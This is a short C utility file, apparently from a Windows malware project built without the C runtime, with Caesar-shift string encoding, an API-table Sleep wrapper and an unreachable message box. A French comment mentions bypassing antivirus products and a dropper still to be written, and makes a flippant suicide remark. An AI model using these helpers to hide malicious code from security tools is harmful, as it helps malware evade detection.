#include "utils.h"
const int _fltused = 0; //fuck linker errors, all my homies hate CRT
extern API Api;

void Message() {
	if (1 == 3) {
		int msgboxID = MessageBox(
			NULL,
			(LPCWSTR)L"Hello this is a message box",
			(LPCWSTR)L"Hello !",
			MB_ICONWARNING | MB_CANCELTRYCONTINUE | MB_DEFBUTTON2
		);
	}
}

#define KEY 5
char* CAESAR(char* in) {
	for (size_t i = 0; i < strlen(in); i++) {
		in[i] += KEY;
	}
	
	return in;
}

char* CAESAR_DECRYPT(char* in) {
	for (size_t i = 0; i < strlen(in); i++) {
		in[i] -= KEY;
	}

	return in;
}

void Sleep_(int time_to_wait) {
	/*
	C'est la derni�re fonction qu'il reste � faire j'en ai marre du no CRT
	et de devoir bypass les AV je vais me suicider il me reste le dropper
	� faire dans les m�mes conditions.
	*/
	return;
	Api.Sleep(time_to_wait * 1000); //TOFIX

	return;
}